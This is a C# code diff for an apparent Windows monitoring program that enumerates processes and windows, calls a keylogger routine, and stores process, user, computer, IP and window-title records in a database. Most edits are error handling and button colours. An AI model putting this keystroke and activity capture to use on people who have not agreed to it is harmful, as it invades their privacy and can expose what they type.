@@ -103,7 +103,7 @@ namespace CrcMrc
             ProcessTimes ProcessTimes = new ProcessTimes();
             IntPtr ProcessList, ProcessHandle = ProcessCPU.PROCESS_HANDLE_ERROR;
             ProcessData CurrentProcessData;
-            int Index;
+            int Index = 0;
             int Total = 0;
             bool NoError;
 
@@ -120,6 +120,7 @@ namespace CrcMrc
             ProcessView.SuspendLayout();
 
             while (NoError)
+                
                 try
                 {
                     // we need a process handle to pass it to GetProcessTimes function
@@ -166,10 +167,12 @@ namespace CrcMrc
 
                     NoError = ProcessCPU.Process32Next(ProcessList, ref ProcessInfo);
                 }
+                
 
             ProcessCPU.CloseHandle(ProcessList);
+            
 
-            Index = 0;
+                Index = 0;
 
             DateTime dt = (System.DateTime)DateTime.Now;
 
@@ -209,7 +212,8 @@ namespace CrcMrc
                 /* counter prozora za gledanje */
                 Int32[] commonElementsView = comm.iHwndView.Intersect(lprozori).ToArray();
                 Int32 commonElementsCounterView = comm.iHwndView.Count() - comm.iHwndView.Except(lprozori).Count();
-                if (commonElementsView.Length > 0 && commonElements.Length == 0)
+                //if (commonElementsView.Length > 0 && commonElements.Length == 0)
+                if (commonElementsView.Length > 0)
                 {
                     row.counter = (short)commonElementsCounterView;
                     row.currWindID = commonElementsView[0].ToString();
@@ -281,7 +285,7 @@ namespace CrcMrc
         private void RunKeyLogger()
         {
             comm.LogKeys();
-            comm.ViewOnly();
+            if(comm.iHwnd.Length == 0)  comm.ViewOnly();
         }
 
 
@@ -302,15 +306,22 @@ namespace CrcMrc
         {
             IntPtr[] apRet = (new IntPtr[256]);
             int iCount = 0;
-            IntPtr pLast = IntPtr.Zero;
-            do
+            try
             {
-                pLast = FindWindowEx(IntPtr.Zero, pLast, null, null);
-                int iProcess_;
-                GetWindowThreadProcessId((int)pLast, out iProcess_);
-                if (iProcess_ == process) apRet[iCount++] = pLast;
-            } while (pLast != IntPtr.Zero);
-            System.Array.Resize(ref apRet, iCount);
+                IntPtr pLast = IntPtr.Zero;
+                do
+                {
+                    pLast = FindWindowEx(IntPtr.Zero, pLast, null, null);
+                    int iProcess_;
+                    GetWindowThreadProcessId((int)pLast, out iProcess_);
+                    if (iProcess_ == process) apRet[iCount++] = pLast;
+                } while (pLast != IntPtr.Zero);
+                System.Array.Resize(ref apRet, iCount);
+            }
+            catch(Exception ex)
+            {
+                Console.WriteLine("error 3 GetProcWin " + ex.Message.ToString());
+            }
             return apRet;
         }
 
@@ -325,7 +336,7 @@ namespace CrcMrc
             }
             catch (Exception ex)
             {
-                Console.WriteLine("error proc 6 " + ex.Message);
+                Console.WriteLine("[-] error PROC 2 " + ex.Message);
                 return retVal;
             }
             return retVal;
@@ -454,7 +465,7 @@ namespace CrcMrc
 
                 if (dbConnect.CheckProcess(row.ProcesName, row.ProcID, row.ProcTime, row.CompName, row.CompUser, row.IP) == false)
                 {
-                    dbConnect.InsertProcess(row.ProcesName, row.ProcID, row.ProcTime, row.CompName, row.CompUser, row.IP, row.Title);
+                    dbConnect.InsertProcess(row.ProcesName, row.ProcID, row.ProcTime, row.CompName, row.CompUser, row.IP, row.Title,row.ViewOnly);
                     LogTo("DELETE  " + row.ProcID + "  " + row.ProcTime, true);
                     row.Delete();
                     if (pdt.Rows.Count > 0)
@@ -526,25 +537,44 @@ namespace CrcMrc
         private void btnUsageTimer_Click(object sender, EventArgs e)
         {
             if (UsageTimer.Enabled == true)
+            {
                 UsageTimer.Enabled = false;
+                btnUsageTimer.BackColor = Color.DarkOrange;
+            }
             else
+            {
                 UsageTimer.Enabled = true;
+                btnUsageTimer.BackColor = SystemColors.Control;
+            }
+
         }
 
         private void btnKeyTime_Click(object sender, EventArgs e)
         {
             if (KeyTime.Enabled == true)
+            {
                 KeyTime.Enabled = false;
+                btnKeyTime.BackColor = Color.DarkOrange;
+            }
             else
+            {
                 KeyTime.Enabled = true;
+                btnKeyTime.BackColor = SystemColors.Control;
+            }
         }
 
         private void btnTimerDB_Click(object sender, EventArgs e)
         {
             if (TimerDB.Enabled == true)
+            {
                 TimerDB.Enabled = false;
+                btnTimerDB.BackColor = Color.DarkOrange;
+            }
             else
+            {
                 TimerDB.Enabled = true;
+                btnTimerDB.BackColor = SystemColors.Control;
+            }
         }
 
         private void ShowCountData()
